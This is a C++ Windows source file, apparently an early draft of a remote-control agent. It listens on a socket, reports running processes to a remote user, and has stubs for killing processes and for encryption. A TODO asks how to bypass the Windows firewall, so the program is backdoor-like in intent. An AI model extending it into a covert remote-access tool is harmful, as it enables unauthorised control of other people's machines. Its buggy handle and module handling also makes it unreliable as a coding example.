/**<
TODO:
    - Put in comments
    - Put in try/catch statements
    - How to bypass windows firewall?
 */

#include <windows.h>
#include <winbase.h>
#include <string>
#include <winver.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <psapi.h>
#include "../../libraries/protocol.h"
#include "../../libraries/logging_class.h"
#include "../../libraries/doWinSock.h"
#include "../../libraries/string_ops.h"


#define REC_DELIM     "\n"
#define FIELD_DELIM   "|"

doWinSock winSockObj;

/* function prototypes */
LRESULT CALLBACK WinProc(HWND, UINT, WPARAM, LPARAM);
std::string encryptBuffer( std::string );
std::string decryptBuffer( std::string );
std::string processCommand( std::string );
std::string getRunningProcs();

int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE,LPSTR szArgs,int nCmdShow)
{
    MSG Msg; // save window messages here.

    Log l;

    std::string currFunc = "WinMain()";

    int socketStatus = 0;

    l.wrln();
    l.wr( currFunc, "Beginning application execution." );

    std::string recvBuffer = "";
    std::string decBuffer = "";
    std::string sendBuffer = "";
    std::string cmdRetBuffer = "";

    l.wr( currFunc, "Instantiating windows socket object." );


    if ( winSockObj.initSocketSetup() != 0 )
    {
        l.wr( currFunc, "Unable to set up socket" );
        return -1;
    }

    socketStatus = winSockObj.initSocketListen();
    if ( socketStatus != 0 )
    {
        l.wr( currFunc, "Unable to create listening socket");
        return -2;
    }
    while(true)
    {
        recvBuffer = "";
        decBuffer = "";
        cmdRetBuffer = "";
        sendBuffer = "";
        l.wr( currFunc, "Connection found" );

        //accept an input

        if( winSockObj.isConnected == true )
        {
            l.wr( currFunc, "Socket connected above" );
        }
        else
        {
            l.wr( currFunc, "Socket not connected above" );
        }

        recvBuffer = winSockObj.recvData();
        decBuffer = decryptBuffer( recvBuffer );

        // decrypt the buffer

        if( decBuffer == SOCK_FAIL )
        {
            winSockObj.resetConnection();
        }
        else
        {

            l.wr( currFunc, "Received data : ", decBuffer );
            cmdRetBuffer = processCommand( decBuffer );

            if( cmdRetBuffer.length() > 0 )
            {
                l.wr( currFunc, "Will encrypt and return buffer : ", cmdRetBuffer );
                sendBuffer = encryptBuffer( cmdRetBuffer );

                if( winSockObj.isConnected == true )
                {
                    winSockObj.sendData( sendBuffer );
                    l.wr( currFunc, "Socket connected below" );
                }
                else
                {
                    l.wr( currFunc, "Socket not connected below" );
                }
            }

            //execute the command
//            winSockObj.processCommand( decBuffer );
        }
    }

    /* Run the message pump. It will run until GetMessage() returns 0 */
    while ( GetMessage ( &Msg, NULL, 0, 0 ) )
    {
        TranslateMessage( &Msg ); // Translate virtual-key messages to character messages
        DispatchMessage( &Msg ); // Send message to WindowProcedure
    }

    return Msg.wParam;
}


/* This function is called by the Windows function DispatchMessage() */
LRESULT CALLBACK WinProc(HWND hWnd,UINT Message,WPARAM wParam,LPARAM lParam)
{
    switch (Message)
    {
    // handle non-trapped messages.
    default:
        return DefWindowProc(hWnd,Message,wParam,lParam);
    }

    return 0; // this indicates a message was trapped.
}

std::string getRunningProcs()
{

    std::string currFunc = "std::string processCommand( std::string cmdString )";
    Log l;
    std::string outBuffer = "";
    std::string message = "";
    std::string errMsg = "";

    HANDLE			    SnapShot;
    PROCESSENTRY32		ProcessList;
    char tInt[20];
    DWORD eNum;
    TCHAR sysMsg[256];
    TCHAR* p;
//    HANDLE processHandle = NULL;
//    TCHAR filename[MAX_PATH];

    HANDLE hModuleSnap = INVALID_HANDLE_VALUE;
    MODULEENTRY32 me32;

    // Grab a snapshot of the running processes
    SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0 );
    if(Process32First(SnapShot, &ProcessList) == FALSE)
    {  // If that failed, see if we can grab the error
        l.wr( currFunc, "Error reading process list" );
        eNum = GetLastError();
        FormatMessage( FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                       NULL, eNum,
                       MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
                       sysMsg, 256, NULL );

        p = sysMsg;
        while( ( *p > 31 ) || ( *p == 9 ) )
            ++p;
        do
        {
            *p-- = 0;
        }
        while( ( p >= sysMsg ) &&
                ( ( *p == '.' ) || ( *p < 33 ) ) );

        message.append( sysMsg );

        // Take note of the error
        l.wr( "Could not read process list - error: ", message );

        // Close the handle to the snapshot
        CloseHandle(SnapShot);

        // Return a failure to our socket
        return SOCK_FAIL;
    }

    // However, if we were able to get the process snapshot, do this stuff
    bool exitloop = false;

    // Go through each item in the snapshot, and put it into ProcessList
    while(exitloop == false)
    {
        if(Process32Next(SnapShot, &ProcessList) == FALSE)
        {  // If there was an error, we are done with the loop
            exitloop = true;
            CloseHandle( SnapShot );
        }

        // If we are still going, do this
        if( exitloop == false )
        {
            // Grab a snapshot of the modules associated with this process
            hModuleSnap = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, ProcessList.th32ProcessID );
            if( hModuleSnap == INVALID_HANDLE_VALUE ){
                l.wr( currFunc, "Failed to get module snapshot.");
            }
            me32.dwSize = sizeof( MODULEENTRY32 );
            if( !Module32First( hModuleSnap, &me32 ) ){
                l.wr(currFunc, "Failed to get first module.");
                CloseHandle( hModuleSnap );
            }

            // Convert the PID to a string
            itoa( ProcessList.th32ProcessID, tInt, 10 );

            // Begin building the buffer we're going to send back
            outBuffer.append( tInt );
            outBuffer.append("|");

            // If we got a valid path from our module, append it.
            if( (unsigned)strlen( me32.szExePath) > 2 ){
//            if( me32.szExePath ){
                outBuffer.append(me32.szExePath );
            }else{  // If we did not, just grab the exe name from the process
                outBuffer.append(ProcessList.szExeFile );
            }
            // Append the record delimiter to our buffer
            outBuffer.append("\n");
        }
    }

    l.wr( currFunc, "List of process PIDs and EXE names: ", outBuffer );

    // Return the buffer that we built so it can be sent back to the client
    return outBuffer;

}

std::string processCommand( std::string cmdString )
{
    std::string currFunc = "std::string processCommand( std::string cmdString )";
    Log l;
    std::string outBuffer = "undefined";

    /* If the user wants to close the connection */
    if ( cmdString == SOCK_RESET )
    {
        winSockObj.resetConnection();

        outBuffer = "";

    }
    else if ( cmdString == LPROC )
    {

        l.wr( currFunc, "Remote user wants the list of processes running here" );
        outBuffer = getRunningProcs();

    }
    else if ( cmdString == KPROC )
    {

        l.wr( currFunc, "Remote user wants to terminate a process" );

    }

    return outBuffer;

}

std::string encryptBuffer( std::string inBuffer )
{

    std::string currFunc = "std::string encryptBuffer( std::string inBuffer )";
    Log l;
    std::string outBuffer;

    l.wr( currFunc, "Received buffer : ", inBuffer );

    outBuffer = inBuffer;

    l.wr( currFunc, "Returning buffer : ", outBuffer );

    return outBuffer;

}

std::string decryptBuffer( std::string inBuffer )
{

    std::string currFunc = "std::string decryptBuffer( std::string inBuffer )";
    Log l;
    std::string outBuffer;

    l.wr( currFunc, "Received buffer : ", inBuffer );

    outBuffer = inBuffer;

    l.wr( currFunc, "Returning buffer : ", outBuffer );

    return outBuffer;

}
